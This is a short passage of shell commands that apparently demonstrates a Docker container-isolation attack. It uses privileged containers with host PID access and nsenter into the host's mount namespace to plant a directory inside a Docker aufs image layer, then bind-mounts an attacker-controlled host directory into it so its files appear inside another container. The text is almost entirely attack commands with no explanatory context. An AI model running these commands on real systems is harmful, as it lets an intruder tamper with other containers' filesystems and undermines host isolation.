...
docker run --privileged --pid=host --rm -it debian:latest nsenter --target 1 --mount mkdir /var/lib/docker/aufs/diff/${layer}/doot

mkdir ${attack}/restricted_area
touch ${attack}/restricted_area/HellloFromTheOtherSide

#Then mount a host directory to doot
docker run --privileged --pid=host --rm -it debian:latest nsenter --target 1 --mount mount -o bind ${attack}/restricted_area /var/lib/docker/aufs/diff/${layer}/doot
